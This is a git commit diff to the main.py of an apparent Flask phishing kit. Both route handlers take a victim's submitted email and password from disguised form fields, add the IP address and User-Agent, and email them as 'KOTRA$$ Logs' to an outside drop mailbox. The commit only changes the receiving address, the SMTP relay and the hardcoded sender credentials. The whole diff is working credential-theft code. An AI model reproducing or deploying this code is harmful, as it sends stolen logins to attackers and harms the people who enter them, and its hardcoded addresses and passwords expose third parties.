570d5b02ee581665d3467f7a82df1162458d3cd8
jonc22 <jonch3n223@gmail.com>
2025-03-24 08:59:48 +0100

    Update main.py

--- main.py
+++ main.py
@@ -191,10 +191,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "contact@quilmaz.space"
-        sender_emaill = "contact"
-        receiver_email = "jerrygood618@gmail.com"
-        password = "vip0c54914629be"
+        sender_email = "johnson@maximalmusclelabs.com"
+        sender_emaill = "johnson"
+        receiver_email = "jinna2323@yandex.com"
+        password = "Dancing2000"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs "
@@ -210,8 +210,8 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("194.61.120.234", 6040) as server:
-            server.login(sender_emaill, password)
+        with smtplib.SMTP('mail.maximalmusclelabs.com', 465) as server:
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
         session['eman'] = email  # Save email as session variable
@@ -231,10 +231,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "contact@quilmaz.space"
-        sender_emaill = "contact"
-        receiver_email = "jerrygood618@gmail.com"
-        password = "vip0c54914629be"
+        sender_email = "johnson@maximalmusclelabs.com"
+        sender_emaill = "johnson"
+        receiver_email = "jinna2323@yandex.com"
+        password = "Dancing2000"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs  !! "
@@ -250,8 +250,8 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("194.61.120.234", 6040) as server:
-            server.login(sender_emaill, password)
+        with smtplib.SMTP('mail.maximalmusclelabs.com', 465) as server:
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
         return redirect(url_for('lasmo', web=email))
